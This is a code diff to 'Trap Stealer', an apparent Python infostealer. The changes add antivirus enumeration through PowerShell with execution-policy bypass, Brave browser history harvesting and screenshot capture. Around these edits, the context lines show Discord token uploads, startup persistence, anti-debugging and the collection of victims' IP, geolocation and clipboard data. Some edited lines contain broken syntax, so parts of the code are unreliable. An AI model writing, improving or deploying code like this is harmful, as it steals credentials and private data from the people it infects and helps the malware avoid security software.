@@ -29,7 +29,11 @@ injection = '%Injection%'
 Startup = '%Startup%' 
 antidebugging = '%No_Debug%' 
 DiscordStop = '%Close%' 
-StartupMessage = 'Error while adding Trap into the startup folder' 
+
+if Startup == False:
+    StartupMessage = 'Adding to startup disabled in the config'
+else:
+    StartupMessage = 'Error while adding Trap into the startup folder' 
 
 requirements = [
     ["requests", "requests"],
@@ -370,6 +374,32 @@ def systemInfo():
 
     return sys_info
 
+import subprocess, os
+
+def avs():
+    file_path = os.path.expandvars(r'%LocalAppData%\Temp\winvs.txt')
+
+    if not os.path.exists(file_path):
+        open(file_path, 'w').close()
+
+    with open(file_path, 'w') as file:
+        file.write('')
+
+    scrs = r'''
+$antivirusProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
+if ($antivirusProducts.Count -ge 2) {
+    $antivirusProducts | Out-File -FilePath "$env:LocalAppData\Temp\winvs.txt" -Append
+} elseif ($antivirusProducts.Count -eq 1) {
+    $antivirusProducts[0] | Out-File -FilePath "$env:LocalAppData\Temp\winvs.txt" -Append
+}
+'''
+
+    subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass' "-Command", scrs])
+
+    with open(file_path, 'r', encoding='utf-16') as file:
+        content = file.read().strip()
+
+    return content
 
 def globalInfo():
     
@@ -389,22 +419,28 @@ def globalInfo():
     postal = data['postal']
     computer_name = socket.gethostname()
     cores = os.cpu_count()
+    avss = avs()
     if platform.system() == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
             gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
     elif platform.system() == 'Windows':
         try:
-            gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read()
-            total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read()
-            free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read()
-            used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read()
-            temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read()
-            gpu = f"GPU Model: {gpu_model}\nTotal Memory: {total_memory} MB\nFree Memory: {free_memory} MB\nUsed Memory: {used_memory} MB\nGPU Temperature: {temperature}°C"
+            gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
+            total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
+            free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read().strip()
+            used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
+            temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
+
+            gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`"
+
         except Exception as e:
             gpu = f"An error occurred: {str(e)}"
 
-    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : {gpu} \nLatitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
+    if len(globalinfo) > 1750:
+        globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
+        
     return globalinfo
 
 # ALL PATH
@@ -590,7 +626,7 @@ def uploadTokq(Tokq, path):
                 "description": f"`Path` : {path}\n",
                 "color": 0xffb6c1,
                 "author": {
-                    "name": f"{username}#{hashtag} ({user_id}) Global Username : {globalusername}",
+                    "name": f"{username}#{hashtag} ({user_id})\nGlobal Username : {globalusername}",
                     "icon_url": pfp
                 },
                 "footer": {
@@ -717,6 +753,14 @@ def find_opera_history_file():
         return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
     except:
         return None
+    
+    
+def find_brave_history_file():
+    try:
+        return find_history_file("BraveSoftware\\Brave-Browser\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+    except:
+        return None
+
 
 def find_safari_history_file():
     try:
@@ -999,7 +1043,7 @@ def getinfo():
             "embeds": [
                 {
                     "title": "🍪 Trap Stealer Information",
-                    "description": f"{globalinfo}\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : {StartupMessage}\nClipboard text : ```{clipboardtext}```",
+                    "description": f"{globalinfo}\n\n**👀 Even more information** : \n `{sysinfo}`\n\n**Startup** : `{StartupMessage}`\nClipboard text : ```{clipboardtext}```",
                     "color": 0xffb6c1,
                     "thumbnail": {
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
@@ -1184,11 +1228,23 @@ def ZipThings(path, arg, procc):
         OtherZip.append([name, lnik])
 
 
+from subprocess import Popen, PIPE
+from optparse import OptionParser
+import datetime
+import os
+import requests
+
+def take_screenshot_first_screen(filename):
+    args = ["import", "-window", "root", filename]
+    p = Popen(args)
+    p.wait()
+
+
+
+
 def srcs():
     try:
 
-        timestamp = str(int(time.time()))
-        rah2 = 'dneS'
         if os.name == "nt":
             
             image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")
@@ -1198,8 +1254,7 @@ def srcs():
                 "-Command",
                 f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{image_folder}\\MyFancyScreenshot.png')"
             ]
-
-            subprocess.run(command)
+            subprocess.run( '-NoProfile', '-ExecutionPolicy', 'Bypass',command)
 
             screenshot_path = os.path.join(image_folder, "MyFancyScreenshot.png")
 
@@ -1219,7 +1274,6 @@ def srcs():
 
     except Exception as e:
         pass
-
 def paaz():
     try:
         global PasswCount
